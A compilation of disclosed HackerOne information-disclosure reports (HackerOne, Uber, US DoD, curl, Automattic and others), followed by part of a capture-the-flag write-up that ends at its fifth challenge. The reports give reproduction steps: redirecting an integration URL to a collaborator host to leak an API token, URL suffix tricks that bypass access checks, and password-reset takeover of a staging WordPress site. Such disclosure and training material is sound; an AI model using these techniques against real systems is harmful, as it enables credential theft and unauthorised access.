Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.

## Impact

Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server

---

### [SNMP Community String Disclosure to ReadOnly Users on EdgeSwitch](https://hackerone.com/reports/797988)

- **Report ID:** `797988`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Ubiquiti Inc.
- **Reporter:** @fr33rh
- **Bounty:** - usd
- **Disclosed:** 2021-05-23T01:22:37.887Z
- **CVE(s):** CVE-2020-8232

**Summary (team):**

Read only users could execute unauthorized tasks  and  through SNMP community string pages.  
These vulnerabilities were found on EdgeSwitch 1G switch (ESWH) and EdgeSwitch 10G switch (ESGH) firmware v1.9.0.

The fix for these vulnerabilities were included in the  EdgeMax EdgeSwitch firmware v1.9.1 
For more details please visit:

https://community.ui.com/releases/EdgeMAX-EdgeSwitch-Firmware-v1-9-1-v1-9-1/8a87dfc5-70f5-4055-8d67-570db1f5695c

https://www.ui.com/download/edgemax

---

### [Improper data update process on UpdatePhabricatorIntegration mutation leads to leak of Phabricator Conduit API token.](https://hackerone.com/reports/1161141)

- **Report ID:** `1161141`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** HackerOne
- **Reporter:** @nukedx
- **Bounty:** - usd
- **Disclosed:** 2021-04-30T05:54:40.703Z
- **CVE(s):** -

**Vulnerability Information:**

## Details
**Title**: Improper data update process on `UpdatePhabricatorIntegration` mutation leads to leak of Phabricator Conduit API token.
**Risk**: High
**Impact**: High
**Exploitability**: High
**Target**: `base_url` parameter on `UpdatePhabricatorIntegration` mutation at `/graphql` endpoint.

## Introduction
Sensitive data exposure occurs when an application, company, or other entity inadvertently exposes personal data. Sensitive data exposure differs from a data breach, in which an attacker accesses and steals information.

## Synopsis
**Phabricator Conduit API** is using simple verification system and requires a valid api token for system bots, integrations etc to get full access to the **Phabricator** instances.

**HackerOne** is allowing their program users to add various integrations for their programs, such as **Phabricator**.  When user with enough permissions adds connection details for the **Phabricator** system stores this information and enables settings options.

Settings for **Phabricator** integration are fetched through GraphQL via using `PhabricatorLayoutQuery` operation, when executed users are fetching similar result as below (see F1262314):
```json
{
  "data": {
    "team": {
      "id": "Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTI1NzQ=",
      "phabricator_integration": {
        "id": "Z2lkOi8vaGFja2Vyb25lL1BoYWJyaWNhdG9ySW50ZWdyYXRpb24vNDA1",
        "__typename": "PhabricatorIntegration",
        "base_url": "https://skima.is/",
        "title": "{{title}}",
        "description": "{{details_markdown}}",
        "process_phabricator_status_change": true,
        "process_phabricator_comment_added": true,
        "process_h1_status_change": true,
        "process_h1_comment_added": true
      },
      "__typename": "Team",
      "handle": "test-phab-api-leak",
      "custom_field_attributes": {
        "total_count": 0,
        "edges": [],
        "__typename": "CustomFieldAttributeConnection"
      }
    }
  }
}
```

As we can see from the results, there is no API token information is revealed due to security measures, when we manipulate request and try to fetch API token with `api_token` field which was field used on initial integration add process, GraphQL returns following error (see F1262318):
```json
{
  "errors": [
    {
      "message": "Field 'api_token' doesn't exist on type 'PhabricatorIntegration'",
      "locations": [
        {
          "line": 29,
          "column": 5
        }
      ],
      "path": [
        "fragment PhabricatorDisconnectForm",
        "phabricator_integration",
        "api_token"
      ],
      "extensions": {
        "code": "undefinedField",
        "typeName": "PhabricatorIntegration",
        "fieldName": "api_token"
      }
    }
  ]
}
```

On **Phabricator** integration UI users can only change bi-directional commenting, updates and report escalation settings (see F1262320). When any change is done, `UpdatePhabricatorIntegration` mutation is executed on GraphQL as following (see F1262329):
```json
{
  "operationName": "UpdatePhabricatorIntegration",
  "variables": {
    "team_id": "Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTIzNjI=",
    "title": "{{title}}",
    "description": "{{details_truncated}}",
    "process_h1_comment_added": true,
    "process_h1_status_change": true,
    "process_phabricator_comment_added": true,
    "process_phabricator_status_change": true
  },
  "query": "mutation UpdatePhabricatorIntegration($team_id: ID!, $base_url: String, $api_token: String, $title: String, $description: String, $process_h1_comment_added: Boolean, $process_h1_status_change: Boolean, $process_phabricator_comment_added: Boolean, $process_phabricator_status_change: Boolean) {\n  updatePhabricatorIntegration(input: {team_id: $team_id, base_url: $base_url, api_token: $api_token, title: $title, description: $description, process_h1_comment_added: $process_h1_comment_added, process_h1_status_change: $process_h1_status_change, process_phabricator_comment_added: $process_phabricator_comment_added, process_phabricator_status_change: $process_phabricator_status_change}) {\n    was_successful\n    errors(first: 100) {\n      edges {\n        node {\n          id\n          type\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    team {\n      id\n      phabricator_integration {\n        id\n        base_url\n        title\n        description\n        process_phabricator_status_change\n        process_phabricator_comment_added\n        process_h1_status_change\n        process_h1_comment_added\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"
}
```
As we can see this is actually similar to initial integration create process, let's see what happens if we try to change `base_url` field and GraphQL replies as following (see F1262334):
```json
{
  "data": {
    "updatePhabricatorIntegration": {
      "was_successful": true,
      "errors": {
        "edges": [],
        "__typename": "ErrorConnection"
      },
      "team": {
        "id": "Z2lkOi8vaGFja2Vyb25lL1RlYW0vNTIzNjI=",
        "phabricator_integration": {
          "id": "Z2lkOi8vaGFja2Vyb25lL1BoYWJyaWNhdG9ySW50ZWdyYXRpb24vNDA4",
          "base_url": "https://bixp32pnbkbisrmuxgsrrzn8lzrufj.burpcollaborator.net",
          "title": "{{title}}",
          "description": "{{details_truncated}}",
          "process_phabricator_status_change": true,
          "process_phabricator_comment_added": true,
          "process_h1_status_change": true,
          "process_h1_comment_added": true,
          "__typename": "PhabricatorIntegration"
        },
        "__typename": "Team"
      },
      "__typename": "UpdatePhabricatorIntegrationPayload"
    }
  }
}
```

It looks like we are able to update `base_url` and HackerOne just does DNS query to check if target host is active and not controlling if user trying to update existing connection, it's also possible to change `api_token`too but we do not need it.

Now let's try to see if we are able to leak token in system, all we need to do is finding active report on system, since there is also no active escalation control on `/reports/<reportid>/escalate_to_phabricator` endpoint unlike `/reports/<reportid>/escalate_to_jira` (see F1262353). We can try to escalate to our Burp Collaborator.

Firstly we will view a triage report and escalate it to the valid **Phabricator** (see F1262348), after that we will change `base_url` to our Burp Collaborator (see F1262349).

Now everything is ready to go just send escalate to **Phabricator** request again without deleting old one (see F1262350) and check if our collaborator got hit.

When we check our burp collaborator, we will see that api token is leaked (see F1262342), now we can restore base url and restore **Phabricator** settings.

## Root cause of the issue
**HackerOne** is using `UpdatePhabricatorIntegration` mutation for both creating and updating **Phabricator** integration however, do not verify that existence of connection.

They are checking if there is active connection and showing settings on UI for according to it, meanwhile not verifying existence of connection is allowing update of the URL for integration.

While team member can use any none triaged report to escalating issue to **Phabricator**, they can also abuse improper escalation check on `/reports/<reportid>/escalate_to_phabricator` endpoint and leak the API token.

## Steps to reproduce
1. Enable Burp Suite or any proxy for tracking and intercepting request done.
2. Create a new team on https://hackerone.com/teams/new/sandbox or use existing team you are member of.
3. Go to **Phabricator** integration located on https://hackerone.com/team_handle/phabricator_integration
4. Set up your **Phabricator** integration
5. Triage a report and escalate it to **Phabricator** integration.
6. Update **Phabricator** integration and intercept the request, add following to the GraphQL query: `"base_url":"https://yourcollab"` and send the request.
7. Send escalate to the **Phabricator** request again for the report, notice that you will get **500** error or create new report and escalate it.
8. Check your collaborator server and notice that token is leaked.

## Impact

A malicious team member with enough rights for controlling **Phabricator** integration settings can alternate existing connections URL and leak api token for it by escalating report then revert setting.

Since not all team members might have administrator rights on **Phabricator** instance, they can gain access to the Conduit API which is having all permission on the system which could lead to complete compromising of it.

---

### [Exposed█████████in apk file - devbuilds.uber.com](https://hackerone.com/reports/848905)

- **Report ID:** `848905`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Uber
- **Reporter:** @m4ll0k
- **Bounty:** - usd
- **Disclosed:** 2021-04-09T20:37:03.052Z
- **CVE(s):** -

**Summary (team):**

Sensitive information was disclosed because of internal token leakage.

---

### [Critical Information disclosure of rtapi token for any user via https://video-support-staging.uber.com/video/api/getPopulousUser](https://hackerone.com/reports/953649)

- **Report ID:** `953649`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Uber
- **Reporter:** @m4ll0k
- **Bounty:** - usd
- **Disclosed:** 2021-03-29T22:26:08.656Z
- **CVE(s):** -

**Summary (team):**

The researcher has identified that the API endpoint  can be leveraged to return a sensitivetoken that can be leveraged for access to rtapi endpoints. As example change x-uber-token value with the following found code:

---

### [Duplicate Entry of email leads to 500 Server Error which disclosing the SQL Database table information](https://hackerone.com/reports/1082891)

- **Report ID:** `1082891`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Kartpay
- **Reporter:** @basant0x01
- **Bounty:** - usd
- **Disclosed:** 2021-03-14T08:52:59.594Z
- **CVE(s):** -

**Summary (team):**

The Issue was with the process of Deletion of the merchant data from the admin Dashboard. The Admin has rights to delete the merchant email ID and further, it gets deleted as Soft delete, not the full delete but there was no Validation to the codes which can detect the re-registration of the same Email ID which leads to the Critical error. 

Secondly, it was found that while pushing the codes in the production, The Debug was enabled and show the data only needed for internal use.

---

### [critical information disclosure](https://hackerone.com/reports/1106009)

- **Report ID:** `1106009`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @ba56adcb299ff13a87475bf
- **Bounty:** - usd
- **Disclosed:** 2021-03-11T21:27:08.208Z
- **CVE(s):** -

**Vulnerability Information:**

##Description:

hey all ,

I have found critical information through this endpoint /██████;

this endpoint contains all env vars used in a  www.██████ such as server credentials, db ,mail , twitter client_id and client_secret , facebook client_id and client_secret, etc...

## Impact

full access control on  every services on website

## System Host(s)
www.█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Go to

https://www.█████████/████████; 

you need to put ; to bypass 401 error

## Suggested Mitigation/Remediation Actions

---

### [critical information disclosure](https://hackerone.com/reports/1106505)

- **Report ID:** `1106505`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @ba56adcb299ff13a87475bf
- **Bounty:** - usd
- **Disclosed:** 2021-03-11T21:25:26.990Z
- **CVE(s):** -

**Vulnerability Information:**

##Description:

hey all ,

I have found critical information through this endpoint ████

on ███████  DB credentials such as DB_NAME,DB_USER,DB_PASSWORD,DB_HOST, etc..

## Impact

full access control on DB service on website

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Go to 

██████/████████?aam-media=1

you nedd to put ?aam-media=1  to bypass blank page

## Suggested Mitigation/Remediation Actions

---

### [CRXDE Lite/CRX is on ██████ exposed that leads to PII disclosure](https://hackerone.com/reports/1095830)

- **Report ID:** `1095830`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @mit0z
- **Bounty:** - usd
- **Disclosed:** 2021-03-11T20:49:46.234Z
- **CVE(s):** -

**Vulnerability Information:**

hi team ,
i found that aem is running on``` ████████ ``` and CRXDE Lite/CRX is exposed to unauthenticated user that can lead to information disclosure

POC
====
1-visit ``` https://██████//██████████ ```
2-go to query and search for admin then execute
3-go to this endpoint to retrieve the information 
```
https://████████//████████/███
```
[+]Request
```
GET //███/███ HTTP/1.1
Host: ████
Connection: close
sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en-XA;q=0.9,en;q=0.8
Cookie: oauth-configid=██████


```
[+]Response
```
HTTP/1.1 200 OK
Date: Thu, 04 Feb 2021 22:23:42 GMT
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Type: application/json;charset=utf-8
Content-Length: 1789
Connection: close
Set-Cookie: ███████; path=/; Httponly; Secure
Strict-Transport-Security: max-age=31536000; includeSubDomains
Set-Cookie: f5avraaaaaaaaaaaaaaaa_session_=█████████; HttpOnly; secure
Set-Cookie: █████████; Path=/

████████

```

█████████

## Impact

PII exposure

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1-visit ``` https://████████//█████████ ```
2-go to query and search for admin then execute
3-go to this endpoint to retrieve the information 
```
https://█████//███████/████
```

## Suggested Mitigation/Remediation Actions

---

### [Information Disclosure(PHPINFO/Credentials) on DoD Asset](https://hackerone.com/reports/883693)

- **Report ID:** `883693`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @atbabers
- **Bounty:** - usd
- **Disclosed:** 2021-03-11T20:41:03.457Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
A DoD leaks credentials on a phpinfo() page.

**Description:**
https://███ publicly displays a phpinfo() page that leaks system information and credentials.

## Impact
The impact is medium not only due to information leakage of numerous different details such as system information but also the leakage of domain credentials.
USERDOMAIN	███████
USERNAME	██████
█████████PASSWORD']	████████

## Step-by-step Reproduction Instructions

1. Visit: https://████/████
2. Information Disclosed

## Suggested Mitigation/Remediation Actions
████████ BAT  suggests removing the ███ page or requiring authentication before making it accessible.

## Impact

The impact is medium not only due to information leakage of numerous different details such as system information but also the leakage of domain credentials.

**Summary (researcher):**

A Department of Defense(DoD) asset leaked the systems' PHPInfo page which contained sensitive information such as Active Directory credentials. This may have led to System Compromise. The DoD Representatives were responsive and thorough when handling my report.

---

### [Disclosure of Merchant_id into the source code without entered OTP code leads to Victims MID takeover.](https://hackerone.com/reports/1082288)

- **Report ID:** `1082288`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Kartpay
- **Reporter:** @basant0x01
- **Bounty:** - usd
- **Disclosed:** 2021-03-08T15:11:01.416Z
- **CVE(s):** -

**Summary (team):**

The System Encryption for the merchant registration was revealing the details which can be further exploitable for the Registration of the merchant. After sharing the details by the @bugera it was fixed by the team.

---

### [Information disclosure via a misconfigured third-party product](https://hackerone.com/reports/739251)

- **Report ID:** `739251`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Algolia
- **Reporter:** @h4x0r_dz
- **Bounty:** - usd
- **Disclosed:** 2021-03-03T10:44:35.695Z
- **CVE(s):** -

**Summary (team):**

The researcher identified a misconfiguration in a third party product that could have been used to retrieve information about Algolia users. We fixed the issue and worked with the provider of the third party product who confirmed that this vulnerability had not been exploited.

**Summary (researcher):**

Disclosure of all Algolia users information, like email, phone ...etc

---

### [Uber employees are sharing information on productforums.google.com](https://hackerone.com/reports/344086)

- **Report ID:** `344086`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Uber
- **Reporter:** @rijalrojan
- **Bounty:** - usd
- **Disclosed:** 2021-02-25T22:14:06.475Z
- **CVE(s):** -

**Summary (team):**

@researcher found an exposed Google spreadsheet on productforums.google.com containing mostly test data. The researcher also found screenshots of Uber tools on Prezi containing driver personal information.

**Summary (researcher):**

This was result of a small research done after https://twitter.com/xKushagra released tip about how companies were leaking information from Trello. During the process, I identified several other domains where employees had shared sensitive information. 

Informational blog link:

---

### [Access to requests and approvals via /█████ allows sensitive information gathering](https://hackerone.com/reports/904671)

- **Report ID:** `904671`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @z32
- **Bounty:** - usd
- **Disclosed:** 2021-02-18T19:12:43.891Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
An adversary is able to view/modify requests and approvals via ████████/████████.

## Step-by-step Reproduction Instructions

1. Browse to █████ and create an account or sign in.
2. Browse to ███████/██████████. You can now view current/past requests.
3. Clicking on these requests seems to allow an adversary to update/create changes/send e-mails, as well as attach files to the requests. I did not test these features as I did not want to impact existing requests, however I believe the ability to view these requests is enough of a security issue by itself as it allows an attacker to identify hardware/software specifications for NIPR/SIPR assets, as well as identifying justifications for the requests (upcoming TDYs, etc.)

## Suggested Mitigation/Remediation Actions
Restrict access to this endpoint to only allow administrators to view requests as well as allowing users to view their own requests or the requests of users in the same workgroup.

## Impact

An adversary can identify hardware/software specifications of NIPRNET/SIPRNET assets. Additionally, an adversary can gather intel based on justification requirements in the requests (upcoming TDYs, deployments, mission posture due to COVID, etc.)

---

### [PII Leak via /██████](https://hackerone.com/reports/905688)

- **Report ID:** `905688`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @z32
- **Bounty:** - usd
- **Disclosed:** 2021-02-18T19:11:50.422Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
An attacker is able to access ServiceNow e-mail notification modules via █████/██████████. Once on this page, the attacker can click any of the notifications, select `Preview Notification`, and choose a user to view their profile data to include Full Name, rank, organization, e-mail address, physical address, and phone number.

## Step-by-step Reproduction Instructions

1. Browse to ██████ and create an account or sign in.
2. Browse to █████████/███████.
3. Click on any of the notification names. Once the notification menu appears, click `Preview Notification` in the top right corner of the screen.
4. The `████` field can now be used to query a user. Once a user is identified, the `(i)` icon can be clicked to view the users PII.
██████

## Suggested Mitigation/Remediation Actions
Restrict access to the █████ and sysevent_email_action.do modules to prevent unauthorized viewing of PII.

## Impact

An adversary can gather PII of all `███████` users via this endpoint.

---

### [PII Leak via /████████](https://hackerone.com/reports/905679)

- **Report ID:** `905679`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @z32
- **Bounty:** - usd
- **Disclosed:** 2021-02-18T19:10:51.200Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
An attacker is able to view PII (Full name/address/e-mail/phone) of all website users via █████████/████████

## Step-by-step Reproduction Instructions

1. Browse to ████ and login or create an account.
2. Browse to ████/███████
3. Begin typing a name in the `Select User` field, and click the `(i)` icon on the right side of the field to view the users data.
██████

## Suggested Mitigation/Remediation Actions
Restrict access to this endpoint to administrative roles.

## Impact

An adversary can gather PII of all `█████████` users via this endpoint.

---

### [PII Leak via /███████](https://hackerone.com/reports/904659)

- **Report ID:** `904659`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @z32
- **Bounty:** - usd
- **Disclosed:** 2021-02-18T19:09:42.629Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
The ██████████ website allows access to PII of all site users via faulty access control to the /██████ endpoint.

## Step-by-step Reproduction Instructions

1. Browse to ████████ and login or create an account.
2. Browse to ███████/████████. You will be able to access PII of all site users (click a username to view the PII).

## Suggested Mitigation/Remediation Actions
Restrict access to the /██████████ module to only administrative users.

## Impact

An adversary can gain access to PII of all ███████ users.

---

### [Unexpected access to process open files via file:///proc/self/fd/n](https://hackerone.com/reports/770190)

- **Report ID:** `770190`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** curl
- **Reporter:** @nyymi
- **Bounty:** - usd
- **Disclosed:** 2021-02-08T07:53:52.299Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
file_connect() routine (https://github.com/curl/curl/blob/1b71bc532bde8621fd3260843f8197182a467ff2/lib/file.c#L134) does not prevent access to /proc/self/fd pseudo filesystem. Application using libcurl and accepting URLs to fetch can be tricked to return content of any open file by passing a specially crafted file:///proc/self/fd/<number> URLs. Since the specific files are open by the application itself, they will always be accessible as long as the files remain open. This will bypass for example drop of privileges performed after opening the file(s).

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Open a privileged file (for example /etc/shadow)
  2. Drop the process privileges
  3. Accept URL as user input
  4. Fetch URL with libcurl
  5. Send received data to user


## Supporting Material/References:

## Impact

Authorization bypass: Access to privileged files otherwise not accessible via file://

---

### [Unauthenticated access to webmail at maildev.happytools.dev leading to compromised wordpress site api.happytools.dev [RCE]](https://hackerone.com/reports/1067547)

- **Report ID:** `1067547`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Automattic
- **Reporter:** @superman85
- **Bounty:** - usd
- **Disclosed:** 2021-02-01T15:37:32.327Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Dear Team,

Today when I trying to find bugs on happy tools I have found 2 domains below for staging environment
- https://maildev.happytools.dev
- https:// api.happytools.dev

Two websites above ssl certificate was expired. But you can adjust your date-time to 02/02/2020 or before that time to access those sites normally

## Platform(s) Affected:
https:// api.happytools.dev

## Steps To Reproduce:

  1. https://api.happytools.dev/wp-login.php?action=lostpassword and forgot password for user `api`
  1. Go to https://maildev.happytools.dev to get reset password link and set new password for user `api` (I did not try to do that)
  1. After changing password for user `api`, we can control wordpress cms and may upload plugins/themes contain backdoor or harmful scripts to this server

## Supporting Material/References:
Some screen shots PoC

{F1132811}

{F1132810}

████████

## Impact

Takeover wordpress site api.happytools.dev

---

### [h1-ctf : 12 days of hack holiday writeup](https://hackerone.com/reports/1069175)

- **Report ID:** `1069175`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** h1-ctf
- **Reporter:** @webhak
- **Bounty:** - usd
- **Disclosed:** 2021-01-14T19:34:55.790Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary
This was a real fun CTF and I really enjoyed solving the challenges. Great job on creating the challenges. 

This is my writeup for the "12 Days of Hacky Holidays CTF". I hope you enjoy reading it, and I hope others reading it will pick up a trick or two.

# Flags:
This is all the flags found during the CTF

* Flag 1: flag{48104912-28b0-494a-9995-a203d1e261e7}
* Flag 2: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
* Flag 3: flag{b705fb11-fb55-442f-847f-0931be82ed9a}
* Flag 4: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
* Flag 5: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
* Flag 6: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
* Flag 7: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
* Flag 8: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
* Flag 9: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
* Flag 10: flag{99309f0f-1752-44a5-af1e-a03e4150757d}
* Flag 11: flag{07a03135-9778-4dee-a83c-7ec330728e72}
* Flag 12: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}


# Intro
Like a lot of other bounty hunters I enjoy reading security related news on Twitter, but on this particular day, something in my feed caught my attention. It was this tweet from [Hackerone](twitter.com/hacker0x01) announcing "12 days of hack holiday":


{F1138752}


The first thought that hit me was: "A CTF with one flag each day? Maybe I can solve one flag each day AND get some sleep as well? This sounds like an unusual CTF, this is going to be a first. I'm in!"


# Writeup
Before we start I would like to introduce the common tools that I have used to solve this CTF, and that I use during my regular security research.

* [FFuF](https://github.com/ffuf/ffuf) - This is an awesome tool, and if this is not familiar to you I highly recommend you check this out. This tool can be used for almost every kind of fuzzing related to web. FFuF is usually used in conjunction with a suitable wordlist for the target. When you use this tool always rate limit it, since the default number of threads and request per second is pretty aggressive. You can use -t to control the number of threads and -rate to control the number of request per second. Be nice to the other CTF players and do not overflow the server with traffic. 
* [SecList](https://github.com/danielmiessler/SecLists) - A very nice collection of wordlists (maybe the best) that is usually used together with a tool, such as FFuF, to do directory brute force, password guessing or other similar things. All wordlists I have used to solve this CTF can be found in the SecList project.
* [Burp](https://portswigger.net/burp) - Every web applications testers go-to intercepting proxy. This has been used to proxy almost all traffic during this CTF.
* Python - An awesome programming language, that is really fast to create small scripts that can automate some cumbersome manual task. To solve this CTF, a couple of Python script was written to automate some of the tasks. 
* [Cyberchef](https://gchq.github.io/CyberChef/) - Nice tool to decode/hash/brute force etc. Really fast to just hash or decode something. 

Ok, now that we are done with the intro, let us get to some hacking!

As always, we start by reading the [program brief](https://hackerone.com/h1-ctf) linked from the announcement tweet. We find the scope and observe that the only in scope domain is `hackyholidays.h1ctf.com`. So we need to ensure that we only send traffic to hackyholidays.h1ctf.com in order to be within the scope of the CTF.

## Flag 1 - robots.txt
By browsing to https://hackyholidays.h1ctf.com we are greeted with the following image: 

{F1138753}

This is not that interesting. Of course the Grinch want to keep out us out, we are here to take down his network such that he can not ruin the holidays! To find out if the server is hosting any other interesting files or endpoints, we run [FFuF](https://github.com/ffuf/ffuf) with a good wordlist. Since we know very little about the target, a good starting point is usually the [common.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt) file from the awesome [SecLists](https://github.com/danielmiessler/SecLists/) project. So by running a content-discovery with FFuF using the common.txt wordlist and filtering out the 404 responses, we get the following result: 

{F1138795}

From the FFuF result, We observe that we get a 200 OK response from the /robots.txt endpoint. This is usually a good starting point to find other, app specific locations, that the common wordlists do not contain. So by browsing to the [robots.txt file](https://hackyholidays.h1ctf.com/robots.txt) in our browser we get the following result from the server, containing the first flag:

{F1138757}

Flag 1 is: `flag{48104912-28b0-494a-9995-a203d1e261e7}`

* * *

## Flag 2 - s3cr3t ar3a
If we observe the robots.txt from the previous step closely, we see that it has one disallow entry in the file, namely `/s3cr3t-ar3a`. If we points our browser to [https://hackyholidays.h1ctf.com/s3cr3t-ar3a](https://hackyholidays.h1ctf.com/s3cr3t-ar3a) endpoint in our browser we see the following page:


{F1138758}


It looks like the page has been moved. But before we move on, we should inspect the HTML to verify that there is no part of the web page that contains any hidden information. We can use the Chrome developer tools to inspect the HTML, and lo and behold! The second flag is displayed in front of our eyes inside the data-info attribute on one of the div tags:

{F1138759}

Flag 2 is: `flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`

* * * 

## Flag 3 - People Rater
Along with flag 2 in the data-info attribute of the div, a `next-app` attribute with the value `/apps` was set. This indicates that in order to find the next flag we must navigate to [https://hackyholidays.h1ctf.com/apps](https://hackyholidays.h1ctf.com/apps). As soon as the challenge was release a link appeared to the "People Rater" application. By clicking the link we are greeted with the mission brief for the People Rater application:

**Mission brief**: 
`The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!`


So we need to find a record that does not belong in the People Rater application. If we start by clicking on one of the items in the Grinch People Rater list, we observe that a HTTP request is made to the back-end URL `/people-rater/entry`. When the user clicks the item "Tea avery" in the list, the URL is called with the id parameter set to `eyJpZCI6Mn0=`. The `ey` part is usually an indicator of a base64 encoded JSON payload. So by decoding the base64 value in your favorite decoder ([Cyberchef](https://gchq.github.io/CyberChef/) or using the [Burp suite](https://portswigger.net/burp) decoder) we get the value: `{"id":2}`. By clicking on the other items in the in the list, we get a similar request but with another id. 

To figure out the valid set of ids, we can use Burp intruder and fuzz every number from 0 to 100 in the id field. If we do this, we find that by sending a payload with the id of 1 we get the following payload from the server:

```json
{
  "id": "eyJpZCI6MX0=",
  "name": "The Grinch",
  "rating": "Amazing in every possible way!",
  "flag": "flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
}

```

Flag 3 is: `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`

* * * 

## Flag 4 - Swag Shop
**Mission Brief**: 
`Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.`

So we will need to find the Grinch's personal detail from the shop, let us explore the shop to check if it is possible. By clicking the purchase button, from the front page of the application, a POST request to the following url is made: `/swag-shop/api/purchase.` The /api part of the URL looks very interesting. To check if there is some other endpoints on the /api path, we can run FFuF against it with the common.txt file from SecList:

{F1138760}

The FFuF run yields three endpoints: /session, /stock and /user. Let us start by looking at why /user yields a 400 response, not 200 that the other endpoints yields. By browsing to the following url: `https://hackyholidays.h1ctf.com/swag-shop/api/user` we can access the user endpoint path of the API, which gives the following message: 

```json
{"error":"Missing required fields"}
```

A 400 response and a message like this is sometimes an indication that the endpoint is expecting some parameters, but we are not providing them. A fast way to check if we may be missing some parameters is to do a parameter brute force with FFuF. We choose the burp-parameter-names.txt wordlist from SecList to perform this brute force. We will filter out any 400 responses, to check if any of the parameter names will yield any other responses than 400:

{F1138761}

So the by adding the parameter uuid, we get a 404 response instead of a 400. If we now navigate our browser to the URL with the parameter uuid set to value, like this: `https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=value` we get the following JSON response from the endpoint:

```json
{"error":"Could not find matching uuid"}
```

This is a clear indication that if we can find a valid uuid, we may get a valid response from this endpoint, hopefully containing some information about the user. Looking back at the initial fuzz we did to discovery API endpoints we see that there is a /session endpoint on the api path. By navigating to [https://hackyholidays.h1ctf.com/swag-shop/api/sessions](https://hackyholidays.h1ctf.com/swag-shop/api/sessions) we get a response back that contains a JSON list of sessions values that is base64 encoded. By decoding them we find one UUID inside the "user" property of the third user with the value: `C7DCCE-0E0DAB-B20226-FC92EA-1B9043`

By navigating the browser to the URL: `https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043`, we get the following JSON response from the server that contains the Grinch's personal details and the flag:

```json
{
  "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "username": "grinch",
  "address": {
    "line_1": "The Grinch",
    "line_2": "The Cave",
    "line_3": "Mount Crumpit",
    "line_4": "Whoville"
  },
  "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```


Flag 4 is: `flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`

* * * 

## Flag 5 - Secure Login
**Mission brief:** 
`Try and find a way past the login page to get to the secret area.`

